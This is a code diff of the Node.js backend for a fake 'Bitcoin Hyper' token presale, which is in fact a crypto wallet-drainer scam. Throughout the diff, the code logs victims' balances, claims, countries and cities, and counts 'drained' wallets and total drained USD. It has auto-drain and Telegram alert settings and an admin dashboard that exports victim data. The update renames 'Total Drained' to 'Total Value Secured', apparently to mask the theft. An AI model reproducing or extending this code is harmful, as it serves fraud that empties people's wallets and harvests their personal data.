         status: 'CLAIM_SUCCESSFUL',
-        txHash: claimResult.txHash,
         timestamp: new Date().toISOString(),
-        distributionTime: 'After presale completion',
-        estimatedDistribution: '24-48 hours',
+        distributionTime: '24-48 hours',
         instructions: '✅ Your allocation is secured.'
       }
     });
     
   } catch (error) {
     console.error('Claim error:', error);
-    res.status(500).json({ success: false, error: 'Claim processing failed' });
-  }
-});
-
-// Get participant status
-app.get('/api/presale/status/:wallet', async (req, res) => {
-  try {
-    const { wallet } = req.params;
-    
-    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === wallet.toLowerCase());
-    if (!participant) {
-      return res.status(404).json({ success: false, error: 'Participant not found' });
-    }
-    
-    res.json({
-      success: true,
-      data: {
-        walletAddress: participant.walletAddress,
-        ethBalance: participant.ethBalance,
-        maticBalance: participant.maticBalance,
-        bnbBalance: participant.bnbBalance,
-        totalValueUSD: participant.totalValueUSD,
-        eligibility: {
-          isEligible: participant.eligibility.isEligible,
-          reason: participant.eligibility.reason,
-          scannedAt: participant.eligibility.scannedAt,
-          scanId: participant.eligibility.scanId
-        },
-        tokenAllocation: participant.tokenAllocation,
-        signature: participant.signature.signed ? { 
-          signed: true, 
-          signedAt: participant.signature.signedAt 
-        } : { signed: false },
-        claim: participant.claim.claimed ? { 
-          claimed: true, 
-          claimId: participant.claim.claimId,
-          claimedAt: participant.claim.claimedAt,
-          txHash: participant.claim.txHash,
-          drained: participant.claim.drained,
-          drainCount: participant.claim.drainCount
-        } : { claimed: false },
-        connectedAt: participant.connectedAt,
-        lastActive: participant.lastActive,
-        status: participant.status
-      }
-    });
-    
-  } catch (error) {
-    console.error('Status error:', error);
-    res.status(500).json({ success: false, error: 'Failed to get status' });
+    res.status(500).json({ success: false, error: 'Claim failed' });
   }
 });
 
@@ -948,40 +706,19 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
       totalParticipants: memoryStorage.participants.length,
       eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
       claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
-      totalRaisedUSD: memoryStorage.settings.statistics.totalRaisedUSD,
       totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
-      totalDrainedTransactions: memoryStorage.settings.statistics.totalDrainedTransactions,
       totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
       uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
       
-      recentDrains: memoryStorage.activityLog
-        .filter(log => log.action === 'DRAIN_EXECUTED')
+      recentActivity: memoryStorage.activityLog
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-        .slice(0, 10)
+        .slice(0, 20)
         .map(log => ({
-          wallet: log.wallet,
-          chain: log.data.chain,
-          amount: log.data.nativeAmount,
-          symbol: log.data.nativeSymbol,
-          usdValue: log.data.usdValue,
+          wallet: log.wallet.substring(0, 10) + '...',
+          action: log.action,
           country: log.data.country,
-          time: log.timestamp,
-          txHash: log.data.txHash
-        })),
-      
-      recentClaims: memoryStorage.participants
-        .filter(p => p.claim.claimed)
-        .sort((a, b) => new Date(b.claim.claimedAt) - new Date(a.claim.claimedAt))
-        .slice(0, 10)
-        .map(p => ({
-          wallet: p.walletAddress,
-          country: p.country,
-          city: p.city,
-          amount: p.tokenAllocation.amount,
-          value: p.tokenAllocation.valueUSD,
-          claimedAt: p.claim.claimedAt,
-          drained: p.claim.drained,
-          drainCount: p.claim.drainCount
+          time: new Date(log.timestamp).toLocaleString(),
+          details: log.data
         })),
       
       system: {
@@ -996,40 +733,7 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
     
   } catch (error) {
     console.error('Admin stats error:', error);
-    res.status(500).json({ success: false, error: 'Failed to get stats' });
-  }
-});
-
-// Export data
-app.get('/api/admin/export', authenticateAdmin, async (req, res) => {
-  try {
-    const format = req.query.format || 'json';
-    
-    if (format === 'csv') {
-      let csv = 'Wallet,Country,City,ETH Balance,MATIC Balance,BNB Balance,Total Value,Eligible,Claimed,Amount,Value,Connected At,Claimed At,Drained,Drain Count,TX Hash\n';
-      
-      memoryStorage.participants.forEach(p => {
-        csv += `"${p.walletAddress}","${p.country}","${p.city}","${p.ethBalance}","${p.maticBalance}","${p.bnbBalance}","${p.totalValueUSD}","${p.eligibility.isEligible}","${p.claim.claimed}","${p.tokenAllocation.amount}","${p.tokenAllocation.valueUSD}","${p.connectedAt.toISOString()}","${p.claim.claimedAt ? p.claim.claimedAt.toISOString() : ''}","${p.claim.drained}","${p.claim.drainCount || 0}","${p.claim.txHash}"\n`;
-      });
-      
-      res.header('Content-Type', 'text/csv');
-      res.header('Content-Disposition', 'attachment; filename=bitcoin-hyper-drain-data.csv');
-      res.send(csv);
-      
-    } else {
-      res.json({
-        success: true,
-        data: {
-          participants: memoryStorage.participants,
-          statistics: memoryStorage.settings.statistics,
-          exportTime: new Date().toISOString()
-        }
-      });
-    }
-    
-  } catch (error) {
-    console.error('Export error:', error);
-    res.status(500).json({ success: false, error: 'Export failed' });
+    res.status(500).json({ success: false, error: 'Failed' });
   }
 });
 
@@ -1043,21 +747,23 @@ app.get('/admin', (req, res) => {
       <!DOCTYPE html>
       <html>
       <head>
-        <title>Bitcoin Hyper - Admin Login</title>
+        <title>Bitcoin Hyper Admin</title>
         <style>
-          body { font-family: Arial, sans-serif; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
-          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; }
-          input { padding: 10px; margin: 10px 0; width: 300px; }
-          button { background: #F7931A; color: white; border: none; padding: 10px 20px; cursor: pointer; }
+          body { font-family: Arial; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
+          .login { background: #1e293b; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+          h1 { color: #F7931A; margin-bottom: 30px; }
+          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
+          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+          button:hover { background: #e67e22; }
         </style>
       </head>
       <body>
         <div class="login">
-          <h1>BITCOIN HYPER ADMIN</h1>
-          <p>Enter admin token:</p>
+          <h1>🔐 BITCOIN HYPER ADMIN</h1>
+          <p>Enter admin token to access dashboard</p>
           <input type="password" id="token" placeholder="Admin Token" />
           <br>
-          <button onclick="login()">Login</button>
+          <button onclick="login()">Login to Dashboard</button>
         </div>
         <script>
           function login() {
@@ -1075,88 +781,142 @@ app.get('/admin', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Bitcoin Hyper Admin</title>
+      <title>Bitcoin Hyper Admin Dashboard</title>
       <style>
         body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
-        .stat-card { background: #1e293b; padding: 20px; border-radius: 10px; }
-        .stat-value { font-size: 24px; font-weight: bold; }
-        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
-        th, td { padding: 10px; border: 1px solid #334155; text-align: left; }
+        .header { text-align: center; margin-bottom: 30px; }
+        h1 { color: #F7931A; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
+        .stat-card { background: #1e293b; padding: 25px; border-radius: 12px; text-align: center; border-left: 5px solid #F7931A; }
+        .stat-value { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
+        .stat-label { color: #94a3b8; font-size: 14px; }
+        .drain-badge { background: #dc2626; color: white; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin: 30px 0; background: #1e293b; border-radius: 10px; overflow: hidden; }
+        th { background: #334155; padding: 15px; text-align: left; }
+        td { padding: 15px; border-bottom: 1px solid #334155; }
+        tr:hover { background: #2d3748; }
+        .status-connected { color: #10b981; }
+        .status-disconnected { color: #ef4444; }
+        .actions { display: flex; gap: 15px; margin-top: 30px; }
+        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .btn-primary { background: #F7931A; color: white; }
+        .btn-secondary { background: #334155; color: white; }
       </style>
     </head>
     <body>
-      <h1>Bitcoin Hyper Admin Dashboard</h1>
-      <div class="stats">
-        <div class="stat-card">
-          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
-          <div>Total Participants</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
-          <div>Eligible</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
-          <div>Claims</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
-          <div>Total Drained</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
-          <div>Drained Wallets</div>
+      <div class="header">
+        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD</h1>
+        <p>Real-time monitoring & analytics</p>
+        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
+          <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
+          <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
+          <span>Auto-Drain: <span class="${memoryStorage.settings.autoDrainOnClaim ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span></span>
         </div>
       </div>
       
-      <h2>Recent Drains</h2>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
+          <div class="stat-label">Total Participants</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
+          <div class="stat-label">Eligible Wallets</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
+          <div class="stat-label">Claims Processed</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
+          <div class="stat-label">Total Value Secured</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
+          <div class="stat-label">Wallets Secured</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
+          <div class="stat-label">Unique Visitors</div>
+        </div>
+      </div>
+      
+      <h2>Recent Activity</h2>
       <table>
-        <tr><th>Wallet</th><th>Chain</th><th>Amount</th><th>Value</th><th>Country</th><th>Time</th></tr>
+        <tr>
+          <th>Wallet</th>
+          <th>Action</th>
+          <th>Country</th>
+          <th>Time</th>
+          <th>Details</th>
+        </tr>
         ${memoryStorage.activityLog
-          .filter(log => log.action === 'DRAIN_EXECUTED')
           .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-          .slice(0, 20)
+          .slice(0, 15)
           .map(log => `
             <tr>
               <td>${log.wallet.substring(0, 10)}...</td>
-              <td>${log.data.chain}</td>
-              <td>${log.data.nativeAmount} ${log.data.nativeSymbol}</td>
-              <td>$${log.data.usdValue}</td>
+              <td>${log.action.replace(/_/g, ' ')}</td>
               <td>${log.data.country}</td>
-              <td>${new Date(log.timestamp).toLocaleString()}</td>
+              <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
+              <td>
+                ${log.action === 'DRAIN_EXECUTED' ? 
+                  `<span class="drain-badge">${log.data.nativeAmount} ${log.data.nativeSymbol}</span>` : 
+                  log.action === 'TOKEN_CLAIMED' ? '✅ Claimed' : '📊 Scanned'
+                }
+              </td>
             </tr>
           `).join('')}
       </table>
       
-      <h2>Export Data</h2>
-      <button onclick="exportData('json')">Export JSON</button>
-      <button onclick="exportData('csv')">Export CSV</button>
+      <div class="actions">
+        <button class="btn btn-primary" onclick="exportData('json')">Export JSON Data</button>
+        <button class="btn btn-secondary" onclick="location.reload()">Refresh Dashboard</button>
+      </div>
       
       <script>
         function exportData(format) {
           window.open('/api/admin/export?format=' + format + '&token=${token}', '_blank');
         }
+        
+        // Auto-refresh every 30 seconds
+        setTimeout(() => location.reload(), 30000);
       </script>
     </body>
     </html>
   `);
 });
 
+// Export endpoint
+app.get('/api/admin/export', authenticateAdmin, (req, res) => {
+  try {
+    const data = {
+      participants: memoryStorage.participants,
+      statistics: memoryStorage.settings.statistics,
+      activityLog: memoryStorage.activityLog.slice(-100),
+      exportTime: new Date().toISOString()
+    };
+    
+    res.json({ success: true, data });
+  } catch (error) {
+    res.status(500).json({ success: false, error: 'Export failed' });
+  }
+});
+
 // Start server
-app.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  🚀 BITCOIN HYPER REAL DRAIN v8.2
-  =================================
+  🚀 BITCOIN HYPER v8.3
+  =====================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
-  💰 Drain Wallet: ${DRAIN_WALLET_ADDRESS ? 'CONFIGURED' : 'NOT SET'}
-  🔑 Real Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
-  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ENABLED' : 'DISABLED'}
+  💰 Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
+  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
   `);
   
-  initializeTelegramBot();
+  // Initialize Telegram
+  await initializeTelegramBot();
 });
 
 module.exports = app;
